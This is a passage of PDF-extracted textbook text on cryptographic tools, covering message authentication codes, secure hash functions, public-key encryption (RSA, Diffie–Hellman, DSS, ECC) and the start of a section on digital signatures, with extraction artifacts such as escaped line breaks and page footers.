receiver share a key (which is \\r\\nas it should be), then only the genuine sender would be able to encrypt a mes\\ufffesage successfully for the other participant, provided the receiver can recognize a \\r\\nvalid message. Furthermore, if the message includes an error-detection code and a \\r\\nsequence number, the receiver is assured that no alterations have been made and \\r\\nthat sequencing is proper. If the message also includes a timestamp, the receiver is \\r\\nassured that the message has not been delayed beyond that normally expected for \\r\\nnetwork transit.\\r\\nIn fact, symmetric encryption alone is not a suitable tool for data authentication. \\r\\nTo give one simple example, in the ECB mode of encryption, if an attacker reorders \\r\\nthe blocks of ciphertext, then each block will still decrypt successfully. However, the \\r\\nreordering may alter the meaning of the overall data sequence. Although sequence \\r\\nnumbers may be used at some level (e.g., each IP packet), it is typically not the case \\r\\nthat a separate sequence number will be associated with each b-bit block of plaintext. \\r\\nThus, block reordering is a threat.\\r\\n2\\r\\nFor simplicity, for the remainder of this section, we refer to message authentication. By this, we mean both \\r\\nauthentication of transmitted messages and of stored data (data authentication).\\r\\nM02_STAL0611_04_GE_C02.indd 59 10/11/17 2:42 PM\\n\\n\\n60 CHAPTER 2 / CRYPTOGRAPHIC TOOLS\\r\\nMessage Authentication without Message Encryption\\r\\nIn this section, we examine several approaches to message authentication that do \\r\\nnot rely on message encryption. In all of these approaches, an authentication tag \\r\\nis generated and appended to each message for transmission. The message itself is \\r\\nnot encrypted and can be read at the destination independent of the authentication \\r\\nfunction at the destination.\\r\\nBecause the approaches discussed in this section do not encrypt the message, \\r\\nmessage confidentiality is not provided. As was mentioned, message encryption by \\r\\nitself does not provide a secure form of authentication. However, it is possible to com\\ufffebine authentication and confidentiality in a single algorithm by encrypting a message \\r\\nplus its authentication tag. Typically, however, message authentication is provided as \\r\\na separate function from message encryption. [DAVI89] suggests three situations in \\r\\nwhich message authentication without confidentiality is preferable:\\r\\n1. There are a number of applications in which the same message is broadcast to \\r\\na number of destinations. Two examples are notification to users that the net\\ufffework is now unavailable, and an alarm signal in a control center. It is cheaper \\r\\nand more reliable to have only one destination responsible for monitoring \\r\\nauthenticity. Thus, the message must be broadcast in plaintext with an associ\\ufffeated message authentication tag. The responsible system performs authen\\ufffetication. If a violation occurs, the other destination systems are alerted by a \\r\\ngeneral alarm.\\r\\n2. Another possible scenario is an exchange in which one side has a heavy load and\\r\\ncannot afford the time to decrypt all incoming messages. Authentication is carried \\r\\nout on a selective basis, with messages being chosen at random for checking.\\r\\n3. Authentication of a computer program in plaintext is an attractive service. The \\r\\ncomputer program can be executed without having to decrypt it every time, \\r\\nwhich would be wasteful of processor resources. However, if a message authen\\ufffetication tag were attached to the program, it could be checked whenever assur\\ufffeance is required of the integrity of the program.\\r\\nThus, there is a place for both authentication and encryption in meeting security \\r\\nrequirements.\\r\\nMESSAGE AUTHENTICATION CODE One authentication technique involves the use \\r\\nof a secret key to generate a small block of data, known as a message authentication \\r\\ncode, that is appended to the message. This technique assumes that two communicat\\ufffeing parties, say A and B, share a common secret key KAB. When A has a message to \\r\\nsend to B, it calculates the message authentication code as a complex function of the \\r\\nmessage and the key: MACM = F(KAB, M).3\\r\\n The message plus code are transmitted \\r\\n3\\r\\nBecause messages may be any size and the message authentication code is a small fixed size, there must \\r\\ntheoretically be many messages that result in the same MAC. However, it should be infeasible in practice \\r\\nto find pairs of such messages with the same MAC. This is known as collision resistance.\\r\\nM02_STAL0611_04_GE_C02.indd 60 10/11/17 2:42 PM\\n\\n\\n2.2 / MESSAGE AUTHENTICATION AND HASH FUNCTIONS 61\\r\\nto the intended recipient. The recipient performs the same calculation on the received \\r\\nmessage, using the same secret key, to generate a new message authentication code. \\r\\nThe received code is compared to the calculated code (see Figure 2.3). If we assume \\r\\nthat only the receiver and the sender know the identity of the secret key, and if the \\r\\nreceived code matches the calculated code, then:\\r\\n1. The receiver is assured that the message has not been altered. If an attacker \\r\\nalters the message but does not alter the code, then the receiver’s calculation \\r\\nof the code will differ from the received code. Because the attacker is assumed \\r\\nnot to know the secret key, the attacker cannot alter the code to correspond to \\r\\nthe alterations in the message.\\r\\n2. The receiver is assured that the message is from the alleged sender. Because no \\r\\none else knows the secret key, no one else could prepare a message with a proper \\r\\ncode.\\r\\n3. If the message includes a sequence number (such as is used with X.25, HDLC, \\r\\nand TCP), then the receiver can be assured of the proper sequence, because an \\r\\nattacker cannot successfully alter the sequence number.\\r\\nA number of algorithms could be used to generate the code. The now with\\ufffedrawn NIST publication FIPS PUB 113 (Computer Data Authentication, May 1985), \\r\\nrecommended the use of DES. However AES would now be a more suitable choice. \\r\\nDES or AES is used to generate an encrypted version of the message, and some of \\r\\nFigure 2.3 Message Authentication Using a Message Authentication Code (MAC)\\r\\nMAC\\r\\nalgorithm\\r\\nMAC\\r\\nalgorithm\\r\\nMAC\\r\\nK\\r\\nK\\r\\nCompare\\r\\nMessage\\r\\nTransmit\\r\\nM02_STAL0611_04_GE_C02.indd 61 10/11/17 2:42 PM\\n\\n\\n62 CHAPTER 2 / CRYPTOGRAPHIC TOOLS\\r\\nthe bits of ciphertext are used as the code. A 16- or 32-bit code used to be typical, but \\r\\nwould now be much too small to provide sufficient collision resistance, as we will \\r\\ndiscuss shortly.4\\r\\nThe process just described is similar to encryption. One difference is that the \\r\\nauthentication algorithm need not be reversible, as it must for decryption. It turns \\r\\nout that because of the mathematical properties of the authentication function, it is \\r\\nless vulnerable to being broken than encryption.\\r\\nONE-WAY HASH FUNCTION An alternative to the message authentication code is \\r\\nthe one-way hash function. As with the message authentication code, a hash function \\r\\naccepts a variable-size message M as input and produces a fixed-size message digest \\r\\nH(M) as output (see Figure 2.4). Typically, the message is padded out to an integer \\r\\nmultiple of some fixed length (e.g., 1024 bits) and the padding includes the value of \\r\\nthe length of the original message in bits. The length field is a security measure to \\r\\nincrease the difficulty for an attacker to produce an alternative message with the \\r\\nsame hash value.\\r\\nUnlike the MAC, a hash function does not take a secret key as input. Figure 2.5 \\r\\nillustrates three ways in which the message can be authenticated using a hash \\r\\nfunction. The message digest can be encrypted using symmetric encryption \\r\\n4\\r\\nRecall from our discussion of practical security issues in Section 2.1 that for large amounts of data, some \\r\\nmode of operation is needed to apply a block cipher such as DES to amounts of data larger than a single \\r\\nblock. For the MAC application mentioned here, DES is applied in what is known as cipher block chaining \\r\\nmode (CBC). In essence, DES is applied to each 64-bit block of the message in sequence, with the input to \\r\\nthe encryption algorithm being the XOR of the current plaintext block and the preceding ciphertext block. \\r\\nThe MAC is derived from the final block encryption. See Chapter 20 for a discussion of CBC.\\r\\nFigure 2.4 Cryptographic Hash Function; h = H(M)\\r\\nMessage or data block M (variable length) P, L\\r\\nH\\r\\nP, L = padding plus length field\\r\\nL bits\\r\\nHash value h\\r\\n(fixed length)\\r\\nM02_STAL0611_04_GE_C02.indd 62 10/11/17 2:42 PM\\n\\n\\n2.2 / MESSAGE AUTHENTICATION AND HASH FUNCTIONS 63\\r\\n(see Figure 2.5a); if it is assumed that only the sender and receiver share the encryp\\ufffetion key, then authenticity is assured. The message digest can also be encrypted using \\r\\npublic-key encryption (see Figure 2.5b); this is explained in Section 2.3. The public\\ufffekey approach has two advantages: It provides a digital signature as well as message \\r\\nauthentication, and it does not require the distribution of keys to communicating \\r\\nparties.\\r\\nFigure 2.5 Message Authentication Using a One-Way Hash Function\\r\\nSource A eD stination B\\r\\nMessage\\r\\nMessage\\r\\nCompare\\r\\nMessage Message\\r\\nH\\r\\nH\\r\\nH\\r\\nE\\r\\n(a) Using symmetric encryption\\r\\nK\\r\\nD\\r\\nK\\r\\nMessage\\r\\nMessage\\r\\nMessage\\r\\nCompare\\r\\nMessage\\r\\nH\\r\\nH\\r\\nH\\r\\nE\\r\\nK\\r\\nK K\\r\\nK\\r\\n(b) Using public-key encryption\\r\\n(c) Using secret value\\r\\nPRa PUa\\r\\nCompare\\r\\nD\\r\\nMessage\\r\\nM02_STAL0611_04_GE_C02.indd 63 10/11/17 2:42 PM\\n\\n\\n64 CHAPTER 2 / CRYPTOGRAPHIC TOOLS\\r\\nThese two approaches have an advantage over approaches that encrypt the \\r\\nentire message, in that less computation is required. But an even more common \\r\\napproach is the use of a technique that avoids encryption altogether. Several reasons \\r\\nfor this interest are pointed out in [TSUD92]:\\r\\n• Encryption software is quite slow. Even though the amount of data to be \\r\\nencrypted per message is small, there may be a steady stream of messages into \\r\\nand out of a system.\\r\\n• Encryption hardware costs are nonnegligible. Low-cost chip implementations \\r\\nof DES and AES are available, but the cost adds up if all nodes in a network \\r\\nmust have this capability.\\r\\n• Encryption hardware is optimized toward large data sizes. For small blocks of \\r\\ndata, a high proportion of the time is spent in initialization/invocation overhead.\\r\\n• An encryption algorithm may be protected by a patent.\\r\\nFigure 2.5c shows a technique that uses a hash function but no encryption for \\r\\nmessage authentication. This technique, known as a keyed hash MAC, assumes that \\r\\ntwo communicating parties, say A and B, share a common secret key K. This secret \\r\\nkey is incorporated into the process of generating a hash code. In the approach illus\\ufffetrated in Figure 2.5c, when A has a message to send to B, it calculates the hash function \\r\\nover the concatenation of the secret key and the message: MDM = H(K}M}K).5\\r\\n \\r\\nIt then sends [M}MDM] to B. Because B possesses K, it can recompute H(K}M}K)\\r\\nand verify MDM. Because the secret key itself is not sent, it should not be possible \\r\\nfor an attacker to modify an intercepted message. As long as the secret key remains \\r\\nsecret, it should not be possible for an attacker to generate a false message.\\r\\nNote the secret key is used as both a prefix and a suffix to the message. If the \\r\\nsecret key is used as either only a prefix or only a suffix, the scheme is less secure. \\r\\nThis topic will be discussed in Chapter 21. Chapter 21 also describes a scheme known \\r\\nas HMAC, which is somewhat more complex than the approach of Figure 2.5c and \\r\\nwhich has become the standard approach for a keyed hash MAC.\\r\\nSecure Hash Functions\\r\\nThe one-way hash function, or secure hash function, is important not only in message \\r\\nauthentication but also in digital signatures. In this section, we begin with a discus\\ufffesion of requirements for a secure hash function. Then we discuss specific algorithms.\\r\\nHASH FUNCTION REQUIREMENTS The purpose of a hash function is to produce a \\r\\n“fingerprint” of a file, message, or other block of data. To be useful for message \\r\\nauthentication, a hash function H must have the following properties:\\r\\n1. H can be applied to a block of data of any size.\\r\\n2. H produces a fixed-length output.\\r\\n3. H(x) is relatively easy to compute for any given x, making both hardware and \\r\\nsoftware implementations practical.\\r\\n5\\r\\n|| denotes concatenation.\\r\\nM02_STAL0611_04_GE_C02.indd 64 10/11/17 2:42 PM\\n\\n\\n2.2 / MESSAGE AUTHENTICATION AND HASH FUNCTIONS 65\\r\\n4. For any given code h, it is computationally infeasible to find x such that H(x) = h.\\r\\nA hash function with this property is referred to as one-way or preimage \\r\\nresistant.\\r\\n6\\r\\n5. For any given block x, it is computationally infeasible to find y ≠ x with \\r\\nH(y) = H(x). A hash function with this property is referred to as second preim\\ufffeage resistant. This is sometimes referred to as weak collision resistant.\\r\\n6. It is computationally infeasible to find any pair (x, y) such that H(x) = H(y).\\r\\nA hash function with this property is referred to as collision resistant. This is \\r\\nsometimes referred to as strong collision resistant.\\r\\nThe first three properties are requirements for the practical application of a hash \\r\\nfunction to message authentication.\\r\\nThe fourth property is the one-way property: It is easy to generate a code given \\r\\na message, but virtually impossible to generate a message given a code. This prop\\ufffeerty is important if the authentication technique involves the use of a secret value \\r\\n(see Figure 2.5c). The secret value itself is not sent; however, if the hash function \\r\\nis not one-way, an attacker can easily discover the secret value: If the attacker can \\r\\nobserve or intercept a transmission, the attacker obtains the message M and the hash \\r\\ncode MDM = H(K}M}K). The attacker then inverts the hash function to obtain \\r\\nK}M}K = H-1\\r\\n(MDM). Because the attacker now has both M and (K}M}K) it is \\r\\na trivial matter to recover K\\r\\nThe fifth property guarantees that it is impossible to find an alternative mes\\ufffesage with the same hash value as a given message. This prevents forgery when an \\r\\nencrypted hash code is used (see Figure 2.5a and b). If this property were not true, \\r\\nan attacker would be capable of the following sequence: First, observe or intercept \\r\\na message plus its encrypted hash code; second, generate an unencrypted hash code \\r\\nfrom the message; and third, generate an alternate message with the same hash code.\\r\\nA hash function that satisfies the first five properties in the preceding list is \\r\\nreferred to as a weak hash function. If the sixth property is also satisfied, then it \\r\\nis referred to as a strong hash function. A strong hash function protects against an \\r\\nattack in which one party generates a message for another party to sign. For example, \\r\\nsuppose Alice agrees to sign an IOU for a small amount that is sent to her by Bob. \\r\\nSuppose also that Bob can find two messages with the same hash value, one of which \\r\\nrequires Alice to pay the small amount, and one that requires a large payment. Alice \\r\\nsigns the first message, and Bob is then able to claim that the second message is \\r\\nauthentic.\\r\\nIn addition to providing authentication, a message digest also provides data \\r\\nintegrity. It performs the same function as a frame check sequence: If any bits in the \\r\\nmessage are accidentally altered in transit, the message digest will be in error.\\r\\nSECURITY OF HASH FUNCTIONS As with symmetric encryption, there are two \\r\\napproaches to attacking a secure hash function: cryptanalysis and brute-force attack. \\r\\nAs with symmetric encryption algorithms, cryptanalysis of a hash function involves \\r\\nexploiting logical weaknesses in the algorithm.\\r\\n6\\r\\nFor f(x) = y, x is said to be a preimage of y. Unless f is one-to-one, there may be multiple preimage \\r\\nvalues for a given y.\\r\\nM02_STAL0611_04_GE_C02.indd 65 10/11/17 2:42 PM\\n\\n\\n66 CHAPTER 2 / CRYPTOGRAPHIC TOOLS\\r\\nThe strength of a hash function against brute-force attacks depends solely on \\r\\nthe length of the hash code produced by the algorithm. For a hash code of length n, \\r\\nthe level of effort required is proportional to the following:\\r\\nPreimage resistant 2n\\r\\nSecond preimage resistant 2n\\r\\nCollision resistant 2n/2\\r\\nIf collision resistance is required (and this is desirable for a general-purpose \\r\\nsecure hash code), then the value 2n/2 determines the strength of the hash code against \\r\\nbrute-force attacks. Van Oorschot and Wiener [VANO94] presented a design for a \\r\\n$10 million collision search machine for MD5, which has a 128-bit hash length, that \\r\\ncould find a collision in 24 days. Thus, a 128-bit code may be viewed as inadequate. \\r\\nThe next step up, if a hash code is treated as a sequence of 32 bits, is a 160-bit hash \\r\\nlength. With a hash length of 160 bits, the same search machine would require over \\r\\nfour thousand years to find a collision. With today’s technology, the time would be \\r\\nmuch shorter, so 160 bits now appears suspect.\\r\\nSECURE HASH FUNCTION ALGORITHMS In recent years, the most widely used hash \\r\\nfunction has been the Secure Hash Algorithm (SHA). SHA was developed by the \\r\\nNational Institute of Standards and Technology (NIST) and published as a fed\\ufffeeral information processing standard (FIPS 180) in 1993. When weaknesses were \\r\\ndiscovered in SHA, a revised version was issued as FIPS 180-1 in 1995 and is gener\\ufffeally referred to as SHA-1. SHA-1 produces a hash value of 160 bits. In 2002, NIST \\r\\nproduced a revised version of the standard, FIPS 180-2, that defined three new ver\\ufffesions of SHA, with hash value lengths of 256, 384, and 512 bits, known as SHA-256, \\r\\nSHA-384, and SHA-512. These new versions, collectively known as SHA-2, have the \\r\\nsame underlying structure and use the same types of modular arithmetic and logical \\r\\nbinary operations as SHA-1. SHA-2, particularly the 512-bit version, would appear to \\r\\nprovide unassailable security. However, because of the structural similarity of SHA-2 \\r\\nto SHA-1, NIST decided to standardize a new hash function that is very different \\r\\nfrom SHA-2 and SHA-1. This new hash function, known as SHA-3, was published in \\r\\n2015 and is now available as an alternative to SHA-2.\\r\\nOther Applications of Hash Functions\\r\\nWe have discussed the use of hash functions for message authentication and for the \\r\\ncreation of digital signatures (the latter will be discussed in more detail later in this \\r\\nchapter). Here are two other examples of secure hash function applications:\\r\\n• Passwords: Chapter 3 will explain a scheme in which a hash of a password is \\r\\nstored by an operating system rather than the password itself. Thus, the actual \\r\\npassword is not retrievable by a hacker who gains access to the password file. \\r\\nIn simple terms, when a user enters a password, the hash of that password is \\r\\ncompared to the stored hash value for verification. This application requires \\r\\npreimage resistance and perhaps second preimage resistance.\\r\\nM02_STAL0611_04_GE_C02.indd 66 10/11/17 2:42 PM\\n\\n\\n2.3 / PUBLIC-KEY ENCRYPTION 67\\r\\n• Intrusion detection: Store the hash value for a file, H(F), for each file on a \\r\\nsystem and secure the hash values (e.g., on a write-locked drive or write-once \\r\\noptical disk that is kept secure). One can later determine if a file has been \\r\\nmodified by recomputing H(F). An intruder would need to change F without \\r\\nchanging H(F). This application requires weak second preimage resistance.\\r\\n2.3 PUBLIC-KEY ENCRYPTION\\r\\nOf equal importance to symmetric encryption is public-key encryption, which finds \\r\\nuse in message authentication and key distribution.\\r\\nPublic-Key Encryption Structure\\r\\nPublic-key encryption, first publicly proposed by Diffie and Hellman in 1976 \\r\\n[DIFF76], is the first truly revolutionary advance in encryption in literally thousands \\r\\nof years. Public-key algorithms are based on mathematical functions rather than on \\r\\nsimple operations on bit patterns, such as are used in symmetric encryption algo\\uffferithms. More important, public-key cryptography is asymmetric, involving the use \\r\\nof two separate keys, in contrast to symmetric encryption, which uses only one key. \\r\\nThe use of two keys has profound consequences in the areas of confidentiality, key \\r\\ndistribution, and authentication.\\r\\nBefore proceeding, we should first mention several common misconceptions \\r\\nconcerning public-key encryption. One is that public-key encryption is more secure \\r\\nfrom cryptanalysis than symmetric encryption. In fact, the security of any encryp\\ufffetion scheme depends on (1) the length of the key and (2) the computational work \\r\\ninvolved in breaking a cipher. There is nothing in principle about either symmetric \\r\\nor public-key encryption that makes one superior to another from the point of view \\r\\nof resisting cryptanalysis. A second misconception is that public-key encryption is \\r\\na general-purpose technique that has made symmetric encryption obsolete. On the \\r\\ncontrary, because of the computational overhead of current public-key encryption \\r\\nschemes, there seems no foreseeable likelihood that symmetric encryption will be \\r\\nabandoned. Finally, there is a feeling that key distribution is trivial when using pub\\ufffelic-key encryption, compared to the rather cumbersome handshaking involved with \\r\\nkey distribution centers for symmetric encryption. For public-key key distribution, \\r\\nsome form of protocol is needed, often involving a central agent, and the procedures \\r\\ninvolved are no simpler or any more efficient than those required for symmetric \\r\\nencryption.\\r\\nA public-key encryption scheme has six ingredients (see Figure 2.6a):\\r\\n• Plaintext: This is the readable message or data that is fed into the algorithm \\r\\nas input.\\r\\n• Encryption algorithm: The encryption algorithm performs various transforma\\ufffetions on the plaintext.\\r\\n• Public and private key: This is a pair of keys that have been selected so if one is \\r\\nused for encryption, the other is used for decryption. The exact transformations \\r\\nM02_STAL0611_04_GE_C02.indd 67 10/11/17 2:42 PM\\n\\n\\n68 CHAPTER 2 / CRYPTOGRAPHIC TOOLS\\r\\nperformed by the encryption algorithm depend on the public or private key that \\r\\nis provided as input.7\\r\\n• Ciphertext: This is the scrambled message produced as output. It depends on \\r\\nthe plaintext and the key. For a given message, two different keys will produce \\r\\ntwo different ciphertexts.\\r\\n• Decryption algorithm: This algorithm accepts the ciphertext and the matching \\r\\nkey and produces the original plaintext.\\r\\nAs the names suggest, the public key of the pair is made public for others to \\r\\nuse, while the private key is known only to its owner. A general-purpose public-key \\r\\ncryptographic algorithm relies on one key for encryption and a different but related \\r\\nkey for decryption.\\r\\nThe essential steps are the following:\\r\\n1. Each user generates a pair of keys to be used for the encryption and decryption \\r\\nof messages.\\r\\n2. Each user places one of the two keys in a public register or other accessible file. \\r\\nThis is the public key. The companion key is kept private. As Figure 2.6a suggests, \\r\\neach user maintains a collection of public keys obtained from others.\\r\\n3. If Bob wishes to send a private message to Alice, Bob encrypts the message using \\r\\nAlice’s public key.\\r\\n4. When Alice receives the message, she decrypts it using her private key. No \\r\\nother recipient can decrypt the message because only Alice knows Alice’s pri\\ufffevate key.\\r\\nWith this approach, all participants have access to public keys, and private keys \\r\\nare generated locally by each participant and therefore need never be distributed. As \\r\\nlong as a user protects his or her private key, incoming communication is secure. At \\r\\nany time, a user can change the private key and publish the companion public key to \\r\\nreplace the old public key.\\r\\nFigure 2.6b illustrates another mode of operation of public-key cryptography. \\r\\nIn this scheme, a user encrypts data using his or her own private key. Anyone who \\r\\nknows the corresponding public key will then be able to decrypt the message.\\r\\nNote the scheme of Figure 2.6a is directed toward providing confidentiality. \\r\\nOnly the intended recipient should be able to decrypt the ciphertext because only \\r\\nthe intended recipient is in possession of the required private key. Whether in fact \\r\\nconfidentiality is provided depends on a number of factors, including the security of \\r\\nthe algorithm, whether the private key is kept secure, and the security of any protocol \\r\\nof which the encryption function is a part.\\r\\nThe scheme of Figure 2.6b is directed toward providing authentication and/\\r\\nor data integrity. If a user is able to successfully recover the plaintext from Bob’s \\r\\nciphertext using Bob’s public key, this indicates only Bob could have encrypted the \\r\\n7\\r\\nThe key used in symmetric encryption is typically referred to as a secret key. The two keys used for \\r\\npublic-key encryption are referred to as the public key and the private key. Invariably, the private key is \\r\\nkept secret, but it is referred to as a private key rather than a secret key to avoid confusion with symmetric \\r\\nencryption.\\r\\nM02_STAL0611_04_GE_C02.indd 68 10/11/17 2:42 PM\\n\\n\\n2.3 / PUBLIC-KEY ENCRYPTION 69\\r\\nFigure 2.6 Public-Key Cryptography\\r\\nPlaintext\\r\\ninput\\r\\nBobs’s\\r\\npublic key\\r\\nring\\r\\nTransmitted\\r\\nciphertext\\r\\nPlaintext\\r\\noutput Encryption algorithm\\r\\n(e.g., RSA)\\r\\nDecryption algorithm\\r\\nJoy\\r\\nMike\\r\\nMike Bob\\r\\nTed\\r\\nAlice\\r\\nAlice’s public\\r\\nkey\\r\\nAlice’s private\\r\\nkey\\r\\n(a) Encryption with public key\\r\\nPlaintext\\r\\ninput\\r\\nTransmitted\\r\\nciphertext\\r\\nPlaintext\\r\\noutput Encryption algorithm\\r\\n(e.g., RSA)\\r\\nDecryption algorithm\\r\\nBob’s private\\r\\nkey\\r\\nBob\\r\\nBob’s public\\r\\nkey\\r\\nAlice’s\\r\\npublic key\\r\\nring\\r\\nJoy Ted\\r\\n(b) Encryption with private key\\r\\nX\\r\\nX\\r\\nPUa\\r\\nPUb\\r\\nPRa\\r\\nPRb\\r\\nY = E[PUa, X]\\r\\nY = E[PRb, X]\\r\\nX =\\r\\nD[PRa, Y]\\r\\nX =\\r\\nD[PUb, Y]\\r\\nAlice\\r\\nBob Alice\\r\\nplaintext, thus providing authentication. Further, no one but Bob would be able to \\r\\nmodify the plaintext because only Bob could encrypt the plaintext with Bob’s private \\r\\nkey. Once again, the actual provision of authentication or data integrity depends on \\r\\na variety of factors. This issue will be addressed primarily in Chapter 21, but other \\r\\nreferences are made to it where appropriate in this text.\\r\\nM02_STAL0611_04_GE_C02.indd 69 10/11/17 2:42 PM\\n\\n\\n70 CHAPTER 2 / CRYPTOGRAPHIC TOOLS\\r\\nApplications for Public-Key Cryptosystems\\r\\nPublic-key systems are characterized by the use of a cryptographic type of algorithm \\r\\nwith two keys, one held private and one available publicly. Depending on the appli\\ufffecation, the sender uses either the sender’s private key or the receiver’s public key, or \\r\\nboth, to perform some type of cryptographic function. In broad terms, we can classify \\r\\nthe use of public-key cryptosystems into three categories: digital signature, symmetric \\r\\nkey distribution, and encryption of secret keys.\\r\\nThese applications will be discussed in Section 2.4. Some algorithms are suit\\ufffeable for all three applications, whereas others can be used only for one or two of \\r\\nthese applications. Table 2.3 indicates the applications supported by the algorithms \\r\\ndiscussed in this section.\\r\\nRequirements for Public-Key Cryptography\\r\\nThe cryptosystem illustrated in Figure 2.6 depends on a cryptographic algorithm \\r\\nbased on two related keys. Diffie and Hellman postulated this system without dem\\ufffeonstrating that such algorithms exist. However, they did lay out the conditions that \\r\\nsuch algorithms must fulfill [DIFF76]:\\r\\n1. It is computationally easy for a party B to generate a pair (public key PUb,\\r\\nprivate key PRb).\\r\\n2. It is computationally easy for a sender A, knowing the public key and the message \\r\\nto be encrypted, M, to generate the corresponding ciphertext:\\r\\nC = E(PUb, M)\\r\\n3. It is computationally easy for the receiver B to decrypt the resulting ciphertext \\r\\nusing the private key to recover the original message:\\r\\nM = D(PRb, C) = D[PRb, E(PUb, M)]\\r\\n4. It is computationally infeasible for an opponent, knowing the public key, PUb, to \\r\\ndetermine the private key, PRb.\\r\\n5. It is computationally infeasible for an opponent, knowing the public key, PUb,\\r\\nand a ciphertext, C, to recover the original message, M.\\r\\nAlgorithm Digital Signature\\r\\nSymmetric Key \\r\\nDistribution\\r\\nEncryption of \\r\\nSecret Keys\\r\\nRSA Yes Yes Yes\\r\\nDiffie–Hellman No Yes No\\r\\nDSS Yes No No\\r\\nElliptic Curve Yes Yes Yes\\r\\nTable 2.3 Applications for Public-Key Cryptosystems\\r\\nM02_STAL0611_04_GE_C02.indd 70 10/11/17 2:42 PM\\n\\n\\n2.3 / PUBLIC-KEY ENCRYPTION 71\\r\\nWe can add a sixth requirement that, although useful, is not necessary for all \\r\\npublic-key applications:\\r\\n6. Either of the two related keys can be used for encryption, with the other used \\r\\nfor decryption.\\r\\nM = D[PUb, E(PRb, M)] = D[PRb, E(PUb, M)]\\r\\nAsymmetric Encryption Algorithms\\r\\nIn this subsection, we briefly mention the most widely used asymmetric encryption \\r\\nalgorithms. Chapter 21 will provide technical details.\\r\\nRSA One of the first public-key schemes was developed in 1977 by Ron Rivest, Adi \\r\\nShamir, and Len Adleman at MIT and first published in 1978 [RIVE78]. The RSA \\r\\nscheme has since reigned supreme as the most widely accepted and implemented \\r\\napproach to public-key encryption. RSA is a block cipher in which the plaintext and \\r\\nciphertext are integers between 0 and n - 1 for some n.\\r\\nIn 1977, the three inventors of RSA dared Scientific American readers to decode \\r\\na cipher they printed in Martin Gardner’s “Mathematical Games” column. They \\r\\noffered a $100 reward for the return of a plaintext sentence, an event they predicted \\r\\nmight not occur for some 40 quadrillion years. In April of 1994, a group working over \\r\\nthe Internet and using over 1600 computers claimed the prize after only eight months \\r\\nof work [LEUT94]. This challenge used a public-key size (length of n) of 129 decimal \\r\\ndigits, or around 428 bits. This result does not invalidate the use of RSA; it simply \\r\\nmeans that larger key sizes must be used. Currently, a 1024-bit key size (about 300 \\r\\ndecimal digits) is considered strong enough for virtually all applications.\\r\\nDIFFIE–HELLMAN KEY AGREEMENT The first published public-key algorithm \\r\\nappeared in the seminal paper by Diffie and Hellman that defined public-key cryptog\\uffferaphy [DIFF76] and is generally referred to as Diffie–Hellman key exchange, or key \\r\\nagreement. A number of commercial products employ this key exchange technique.\\r\\nThe purpose of the algorithm is to enable two users to securely reach agree\\ufffement about a shared secret that can be used as a secret key for subsequent symmetric \\r\\nencryption of messages. The algorithm itself is limited to the exchange of the keys.\\r\\nDIGITAL SIGNATURE STANDARD The National Institute of Standards and Technology \\r\\n(NIST) published this originally as FIPS PUB 186 (Digital Signature Standard (DSS), \\r\\nMay 1994). The DSS makes use of SHA-1 and presents a new digital signature tech\\ufffenique, the Digital Signature Algorithm (DSA). The DSS was originally proposed in \\r\\n1991 and revised in 1993 in response to public feedback concerning the security of the \\r\\nscheme. There were further revisions in 1998, 2000, 2009, and most recently in 2013 as \\r\\nFIPS PUB 186–4. The DSS uses an algorithm that is designed to provide only the digital \\r\\nsignature function. Unlike RSA, it cannot be used for encryption or key exchange.\\r\\nELLIPTIC CURVE CRYPTOGRAPHY The vast majority of the products and standards \\r\\nthat use public-key cryptography for encryption and digital signatures use RSA. \\r\\nThe bit length for secure RSA use has increased over recent years, and this has \\r\\nput a heavier processing load on applications using RSA. This burden has ramifica\\ufffetions, especially for electronic commerce sites that conduct large numbers of secure \\r\\nM02_STAL0611_04_GE_C02.indd 71 10/11/17 2:42 PM\\n\\n\\n72 CHAPTER 2 / CRYPTOGRAPHIC TOOLS\\r\\ntransactions. Recently, a competing system has begun to challenge RSA: elliptic curve \\r\\ncryptography (ECC). Already, ECC is showing up in standardization efforts, includ\\ufffeing the IEEE (Institute of Electrical and Electronics Engineers) P1363 Standard for \\r\\nPublic-Key Cryptography.\\r\\nThe principal attraction of ECC compared to RSA is that it appears to offer \\r\\nequal security for a far smaller bit size, thereby reducing processing overhead. On \\r\\nthe other hand, although the theory of ECC has been around for some time, it is \\r\\nonly recently that products have begun to appear and that there has been sustained \\r\\ncryptanalytic interest in probing for weaknesses. Thus, the confidence level in ECC \\r\\nis not yet as high as that in RSA.\\r\\n2.4 DIGITAL SIGNATURES AND KEY MANAGEMENT\\r\\nAs mentioned in Section 2.3, public-key algorithms are used in a variety of applica\\ufffetions. In broad terms, these applications fall into two categories: digital signatures, \\r\\nand various techniques to do with key management and distribution.\\r\\nWith respect to key management and distribution, there are at least three \\r\\ndistinct aspects to the use of public-key encryption in this regard:\\r\\n• The secure distribution of public keys\\r\\n• The use of public-key encryption to distribute secret keys\\r\\n• The use of public-key encryption to create temporary keys for message encryption\\r\\nThis section provides a brief overview of digital signatures and the various types of \\r\\nkey management and distribution.\\r\\nDigital Signature\\r\\nPublic-key encryption can be used for authentication with a technique known as the \\r\\ndigital signature. NIST FIPS PUB 186-4 [Digital Signature Standard (DSS), July 2013] \\r\\ndefines a digital signature as follows: The result of a cryptographic transformation \\r\\nof data that, when properly implemented, provides a mechanism for verifying origin \\r\\nauthentication, data integrity and signatory non-repudiation.\\r\\nThus, a digital signature is a data-dependent bit pattern, generated by an agent \\r\\nas a function of a file, message, or other form of data block. Another agent can access \\r\\nthe data block and its associated signature and verify (1) the data block has been \\r\\nsigned by the alleged signer, and (2) the data block has not been altered since the \\r\\nsigning. Further, the signer cannot repudiate the signature.\\r\\nFIPS 186-4 specifies the use of one of three digital signature algorithms:\\r\\n• Digital Signature Algorithm (DSA): The original NIST-approved algorithm, \\r\\nwhich is based on the difficulty of computing discrete logarithms.\\r\\n• RSA Digital Signature Algorithm: Based on the RSA public-key algorithm.\\r\\n• Elliptic Curve Digital Signature Algorithm (ECDSA): Based on elliptic-curve \\r\\ncryptography.\\r\\nFigure 2.7 is a generic model of the process of making and using digital signa\\ufffetures. All of the digital signature schemes in FIPS 186-4 have this structure. Suppose \\r\\nM02_STAL0611_04_GE_C02.indd 72 10/11/17 2:42 PM\\n\\n\\n2.4 / DIGITAL SIGNATURES AND KEY MANAGEMENT 73\\r\\nBob wants to send a message to Alice. Although it is not important that the message \\r\\nbe kept secret, he wants Alice to be certain that the message is indeed from him. \\r\\nFor this purpose, Bob uses a secure hash function, such as SHA-512, to generate a \\r\\nhash value for the message. That hash value, together with Bob’s private key, serve 